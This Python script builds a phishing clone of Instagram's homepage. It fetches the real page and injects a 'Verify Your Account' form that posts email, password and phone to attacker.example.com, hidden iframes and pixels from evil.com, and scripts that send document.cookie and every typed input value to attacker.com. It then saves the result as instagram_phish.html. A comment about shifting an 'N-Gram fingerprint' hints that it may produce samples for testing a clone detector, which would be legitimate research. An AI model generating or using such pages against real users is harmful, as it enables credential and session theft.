from bs4 import BeautifulSoup
import asyncio
from modules.retrieval import fetch_webpage

async def fetch():
    html = await fetch_webpage('https://instagram.com')
    return html

html = asyncio.run(fetch())
soup = BeautifulSoup(html, 'html.parser')

# Helper to build a nested div tree
def make_nested_divs(soup, depth, label):
    outer = soup.new_tag("div", id=f"{label}-wrapper")
    current = outer
    for i in range(depth):
        inner = soup.new_tag("div")
        inner_span = soup.new_tag("span")
        inner_span.string = f"{label}-layer-{i}"
        inner.append(inner_span)
        current.append(inner)
        current = inner
    return outer

# 1. Inject a realistic credential-stealing form structure (typical phishing attack)
phish_section = soup.new_tag("section", id="account-verify")
phish_header = soup.new_tag("h2")
phish_header.string = "Verify Your Account"
phish_form = soup.new_tag("form", action="http://attacker.example.com/capture", method="POST")
for field_type, field_name in [("text", "email"), ("password", "password"), ("text", "phone")]:
    label = soup.new_tag("label")
    label.string = field_name
    inp = soup.new_tag("input", type=field_type)
    inp['name'] = field_name
    phish_form.append(label)
    phish_form.append(inp)
submit_btn = soup.new_tag("button", type="submit")
submit_btn.string = "Verify Now"
phish_form.append(submit_btn)
phish_section.append(phish_header)
phish_section.append(phish_form)
if soup.body:
    soup.body.insert(0, phish_section)

# 2. Inject tracking pixels and external resource loaders
for i in range(3):
    img = soup.new_tag("img", src=f"http://tracker.evil.com/pixel_{i}.gif", width="1", height="1")
    iframe = soup.new_tag("iframe", src=f"http://evil.com/payload_{i}", width="0", height="0")
    if soup.body:
        soup.body.append(img)
        soup.body.append(iframe)

# 3. Inject deeply nested attacker navigation structure
attacker_nav = soup.new_tag("nav", id="attacker-menu")
for i in range(5):
    ul = soup.new_tag("ul")
    for j in range(4):
        li = soup.new_tag("li")
        a = soup.new_tag("a", href=f"http://attacker.com/page{j}")
        a.string = f"Fake Link {i}-{j}"
        li.append(a)
        ul.append(li)
    attacker_nav.append(ul)
if soup.body:
    soup.body.insert(0, attacker_nav)

# 4. Inject credential exfiltration scripts
for script_code in [
    "document.addEventListener('DOMContentLoaded', function(){ fetch('http://attacker.com/steal?c='+document.cookie); });",
    "window.onload=function(){var x=document.querySelectorAll('input');x.forEach(function(e){e.addEventListener('change',function(){fetch('http://attacker.com/key?v='+e.value);});});};"
]:
    s = soup.new_tag("script")
    s.string = script_code
    if soup.body:
        soup.body.append(s)

# 5. Add nested structural noise to meaningfully shift the N-Gram fingerprint
if soup.body:
    soup.body.append(make_nested_divs(soup, depth=10, label="noise-a"))
    soup.body.append(make_nested_divs(soup, depth=8, label="noise-b"))

# 6. Add a fake aside/footer to structurally modify the layout
aside = soup.new_tag("aside", id="phishing-sidebar")
for i in range(6):
    article = soup.new_tag("article")
    p = soup.new_tag("p")
    p.string = f"Fake promo content block {i}"
    article.append(p)
    aside.append(article)
if soup.body:
    soup.body.append(aside)

clone_path = 'clones/instagram_phish.html'
with open(clone_path, 'w', encoding='utf-8') as f:
    f.write(str(soup))

print("Successfully injected realistic phishing structures into the clone.")
